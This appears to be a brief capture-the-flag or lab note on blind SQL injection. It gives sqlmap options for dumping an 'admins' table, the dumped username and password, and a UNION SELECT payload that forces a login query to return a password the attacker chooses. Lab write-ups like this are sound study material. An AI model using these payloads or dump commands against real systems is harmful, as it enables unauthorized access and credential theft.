____
`
Blind SQLi

SQLmap

```bash
--level 5 --risk 3 -p username --batch --threads 10 -T admins -D level2 -  
-dump
```

```
+----+----------+----------+  
| id | password | username |  
+----+----------+----------+  
| 1  | cheryl   | joellen  |  
+----+----------+----------+
```


Change request method

![[Pasted image 20241114192816.png]]

SQLi

```sql
test' UNION SELECT 'danidani'-- -
```

![[Pasted image 20241114193326.png]]

```sql
SELECT password FROM admins where username='joellen'
```
returns cheryl

```sql
SELECT password FROM admins where username='joellen' UNION SELECT 'password'
```
returns cheryl

```sql
SELECT password FROM admins where username='test' UNION SELECT 'password'
```
returns password (with no real username)

![[Pasted image 20241114193731.png]]


```sql
SELECT password FROM admins where username='test' UNION SELECT 'danidani'
```
returns danidani (with no real username)